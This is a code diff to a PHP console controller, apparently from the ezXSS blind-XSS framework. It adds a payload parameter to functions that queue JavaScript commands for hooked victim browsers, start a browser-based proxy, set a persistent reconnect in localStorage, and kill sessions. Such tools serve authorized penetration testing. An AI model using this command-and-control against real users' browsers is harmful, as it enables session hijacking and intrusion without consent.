@@ -112,7 +112,7 @@ class ConsoleController extends Controller
             throw new HttpException(422, 'command is required');
         }
 
-        $commandId = Console::add($group['client_id'], $group['origin'], $command);
+        $commandId = Console::add($group['client_id'], $group['origin'], $group['payload'],$command);
         return array('queued' => true, 'command_id' => $commandId, 'command' => $command);
     }
 
@@ -128,7 +128,7 @@ class ConsoleController extends Controller
 
         $queued = array();
         $sent = array();
-        foreach (Console::listFor($group['client_id'], $group['origin']) as $row) {
+        foreach (Console::listFor($group['client_id'], $group['origin'], $group['payload']) as $row) {
             $entry = array(
                 'id'      => (int) $row['id'],
                 'command' => $row['command'],
@@ -151,10 +151,10 @@ class ConsoleController extends Controller
     public function doOutput($id)
     {
         $group = $this->gate($id, 'view');
-        $session = Session::findLatest($group['client_id'], $group['origin']);
+        $session = Session::findLatest($group['client_id'], $group['origin'], $group['payload']);
         $last = $session ? (int) $session['updated_at'] : null;
         return array(
-            'console' => Session::consoleOutput($group['client_id'], $group['origin']),
+            'console' => Session::consoleOutput($group['client_id'], $group['origin'], $group['payload']),
             'last'    => $last,
         );
     }
@@ -180,9 +180,9 @@ class ConsoleController extends Controller
         $autoReconnect = isset($body['autoreconnect']) ? $this->asBool($body['autoreconnect']) : false;
 
         $passFlag = $passOrigin ? '1' : '0';
-        Console::add($group['client_id'], $group['origin'], "ez_soc('$ipport', $passFlag)");
+        Console::add($group['client_id'], $group['origin'], $group['payload'],"ez_soc('$ipport', $passFlag)");
         if ($autoReconnect) {
-            Console::add($group['client_id'], $group['origin'], "localStorage.setItem('ezProxy', '$ipport');");
+            Console::add($group['client_id'], $group['origin'], $group['payload'],"localStorage.setItem('ezProxy', '$ipport');");
         }
 
         $message = "Proxy started on $ipport is accessible on http://" . $group['client_id'] . '.ezxss'
@@ -207,7 +207,7 @@ class ConsoleController extends Controller
     public function doKill($id)
     {
         $group = $this->gate($id, 'edit');
-        Console::add($group['client_id'], $group['origin'], 'ez_stop()');
+        Console::add($group['client_id'], $group['origin'], $group['payload'],'ez_stop()');
         return array('queued' => true, 'message' => 'Killed persistent');
     }
 
@@ -220,7 +220,7 @@ class ConsoleController extends Controller
     public function doKillReconnect($id)
     {
         $group = $this->gate($id, 'edit');
-        Console::add($group['client_id'], $group['origin'], "localStorage.removeItem('ezProxy');");
+        Console::add($group['client_id'], $group['origin'], $group['payload'],"localStorage.removeItem('ezProxy');");
         return array('queued' => true, 'message' => 'Killed auto reconnect');
     }
 
@@ -273,11 +273,11 @@ class ConsoleController extends Controller
             }
 
             if ($action === 'execute') {
-                Console::add($group['client_id'], $group['origin'], $command);
+                Console::add($group['client_id'], $group['origin'], $group['payload'],$command);
             } elseif ($action === 'kill') {
-                Console::add($group['client_id'], $group['origin'], 'ez_stop()');
+                Console::add($group['client_id'], $group['origin'], $group['payload'],'ez_stop()');
             } else {
-                Console::add($group['client_id'], $group['origin'], "localStorage.removeItem('ezProxy');");
+                Console::add($group['client_id'], $group['origin'], $group['payload'],"localStorage.removeItem('ezProxy');");
             }
             $applied++;
         }
